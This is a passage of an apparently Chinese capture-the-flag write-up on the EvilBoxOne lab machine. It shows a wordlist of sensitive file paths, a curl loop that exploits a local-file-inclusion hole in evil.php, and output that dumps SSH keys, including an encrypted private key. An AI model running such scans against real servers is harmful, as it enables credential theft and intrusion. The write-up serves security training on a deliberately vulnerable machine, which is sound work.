aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span><br><span class="line">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</span><br><span class="line">#   EscapeChar ~</span><br><span class="line">#   Tunnel no</span><br><span class="line">#   TunnelDevice any:any</span><br><span class="line">#   PermitLocalCommand no</span><br><span class="line">#   VisualHostKey no</span><br><span class="line">#   ProxyCommand ssh -q -W %h:%p gateway.example.com</span><br><span class="line">#   RekeyLimit 1G 1h</span><br><span class="line">    SendEnv LANG LC_*</span><br><span class="line">    HashKnownHosts yes</span><br><span class="line">    GSSAPIAuthentication yes</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_dsa_key:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_dsa_key:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_dsa_key.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_dsa_key.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_key:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_key:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_key.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_key.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_rsa_key:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_rsa_key:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_rsa_key.pub:</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsg5B3Ae75r4szTNFqG247Ea8vKjxulITlFGE9YEK4KLJA86TskXQn9E24yX4cYMoF0WDn7JD782HfHCrV74r8nU2kVTw5Y8ZRyBEqDwk6vmOzMvq1Kzrcj+i4f17saErC9YVgx5/33e7UkLXt3MYVjVPIekf/sxWxS4b6N0+J1xiISNcoL/kmG3L7McJzX6Qx6cWtauJf3HOxNtZJ94WetHArSpUyIsn83P+Quxa/uaUgGPx4EkHL7Qx3AVIBbKA7uDet/pZUchcPq/4gv25DKJH4XIty+5/yNQo1EMd6Ra5A9SmnhWjSxdFqTGHpdKnyYHr4VeZ7cpvpQnoiV4y9 root@EvilBoxOne</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_host_rsa_key.pub:</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsg5B3Ae75r4szTNFqG247Ea8vKjxulITlFGE9YEK4KLJA86TskXQn9E24yX4cYMoF0WDn7JD782HfHCrV74r8nU2kVTw5Y8ZRyBEqDwk6vmOzMvq1Kzrcj+i4f17saErC9YVgx5/33e7UkLXt3MYVjVPIekf/sxWxS4b6N0+J1xiISNcoL/kmG3L7McJzX6Qx6cWtauJf3HOxNtZJ94WetHArSpUyIsn83P+Quxa/uaUgGPx4EkHL7Qx3AVIBbKA7uDet/pZUchcPq/4gv25DKJH4XIty+5/yNQo1EMd6Ra5A9SmnhWjSxdFqTGHpdKnyYHr4VeZ7cpvpQnoiV4y9 root@EvilBoxOne</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/sysconfig/network:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/sysconfig/network:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/home/apache/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/home/apache2/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/home/bin/stable/apache/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/home2/bin/stable/apache/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/NetServer/bin/stable/apache/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/opt/www/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/opt/www/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/opt/www/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/opt/xampp/etc/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/PHP/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/php/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/php4/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/php5/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.atftp_history:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.bashrc:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.bash_history:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.mysql_history:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.nano_history:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.php_history:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.profile:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/authorized_keys:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/identity:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/identity.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_dsa:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_dsa.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_rsa:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_rsa.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/root/anaconda-ks.cfg:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/tmp/apache/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/tmp/apache/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/lib/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/lib/php/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/conf/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/logs/access.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/logs/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/logs/access_logaccess_log.old:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/logs/error.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/logs/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache/logs/error_logerror_log.old:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache2/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache2/conf/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache2/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/apache2/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs/license_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs/login_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs/stats_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/cpanel/logs/stats_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/etc/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/httpd/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/httpd2.2/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/httpd2.2/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/lib/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/mysql/bin/mysql:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/mysql/my.cnf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php/lib/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php4/lib/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php4/lib/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php4/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php5/etc/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php5/lib/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/php5/php5.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/share/examples/php/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/share/examples/php4/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/tomcat5527/bin/version.sh:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/local/Zend/etc/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/share/tomcat6/bin/startup.sh:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/usr/tomcat6/bin/startup.sh:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/apache2/config.inc:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/httpd/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/httpd/conf/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/httpd/conf/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/httpd/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/httpd/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/lib/mysql/my.cnf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/lib/mysql/mysql/user.MYD:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/local/www/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/local/www/conf/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/access.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache/access.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache/error.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache2/access.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache2/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache2/error.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/apache2/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/error.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/mysql.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/mysql/mysql-bin.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/mysql/mysql-slow.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/mysql/mysql.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/log/mysqlderror.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/mail/root:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/mysql.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/spool/cron/crontabs/root:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/spool/mail/root:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/logs/access.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/logs/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/logs/error.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/var/www/logs/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/web/conf/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/www/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/www/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/www/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/www/php/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/www/php4/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/www/php5/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/xampp/apache/bin/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/xampp/apache/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/authorized_keys:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/identity:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/identity.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/id_dsa:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/id_dsa.pub:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/id_rsa:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;root/.ssh/id_rsa.pub:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>copy blog</p>
<p>下面是中奖内容：</p>
<ul>
<li>&#x2F;etc&#x2F;crontab 内容是默认</li>
<li>&#x2F;etc&#x2F;fstab 内容是默认</li>
<li>&#x2F;etc&#x2F;host.conf 内容是默认</li>
<li>&#x2F;etc&#x2F;ld.so.conf 内容是默认</li>
<li>&#x2F;etc&#x2F;network&#x2F;interfaces 内容是默认</li>
<li>&#x2F;etc&#x2F;networks 无用</li>
<li>&#x2F;etc&#x2F;passwd</li>
<li>&#x2F;etc&#x2F;resolv.conf 无用</li>
<li>&#x2F;etc&#x2F;ssh&#x2F;sshd_config 内容是默认</li>
<li>&#x2F;etc&#x2F;ssh&#x2F;ssh_config 内容是默认</li>
<li>&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</li>
</ul>
<p>新的细节发现</p>
<ul>
<li>&#x2F;etc&#x2F;passwd<ul>
<li>我们知道还存在一个名为 mowree 的用户</li>
</ul>
</li>
<li>&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub<ul>
<li>ssh 登录线索，并且登录指向 <code>root@EvilBoxOne</code></li>
</ul>
</li>
</ul>
<h3 id="ssh-dict-txt"><a href="#ssh-dict-txt" class="headerlink" title="ssh_dict.txt"></a>ssh_dict.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/ssh_host_dsa_key</span><br><span class="line">/root/.ssh/ssh_host_dsa_key.pub</span><br><span class="line">/root/.ssh/ssh_host_key</span><br><span class="line">/root/.ssh/ssh_host_key.pub</span><br><span class="line">/root/.ssh/ssh_host_rsa_key</span><br><span class="line">/root/.ssh/ssh_host_rsa_key.pub</span><br><span class="line">/home/mowree/.ssh/authorized_keys</span><br><span class="line">/home/mowree/.ssh/identity</span><br><span class="line">/home/mowree/.ssh/identity.pub</span><br><span class="line">/home/mowree/.ssh/id_dsa</span><br><span class="line">/home/mowree/.ssh/id_dsa.pub</span><br><span class="line">/home/mowree/.ssh/id_rsa</span><br><span class="line">/home/mowree/.ssh/id_rsa.pub</span><br><span class="line">/home/mowree/.ssh/ssh_host_dsa_key</span><br><span class="line">/home/mowree/.ssh/ssh_host_dsa_key.pub</span><br><span class="line">/home/mowree/.ssh/ssh_host_key</span><br><span class="line">/home/mowree/.ssh/ssh_host_key.pub</span><br><span class="line">/home/mowree/.ssh/ssh_host_rsa_key</span><br><span class="line">/home/mowree/.ssh/ssh_host_rsa_key.pub</span><br></pre></td></tr></table></figure>

<p>攻击脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat ./ssh_dict.txt);</span><br><span class="line">do</span><br><span class="line">	echo &quot;###################################&quot;</span><br><span class="line">	echo &quot;&gt;&gt;&gt;$i:&quot;;</span><br><span class="line">	curl &quot;http://192.168.56.105/secret/evil.php?command=$i&quot; -m 1 -s</span><br><span class="line">	sleep 0.5</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ./s2.sh                                                                                </span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/authorized_keys:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/identity:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/identity.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_dsa:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_dsa.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_rsa:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/id_rsa.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/ssh_host_dsa_key:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/ssh_host_dsa_key.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/ssh_host_key:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/ssh_host_key.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/ssh_host_rsa_key:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/root/.ssh/ssh_host_rsa_key.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/authorized_keys:</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/identity:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/identity.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/id_dsa:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/id_dsa.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/id_rsa:</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/id_rsa.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/ssh_host_dsa_key:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/ssh_host_dsa_key.pub:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/ssh_host_key:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/ssh_host_key.pub:</span><br><span class="line">###################################</span><br><span 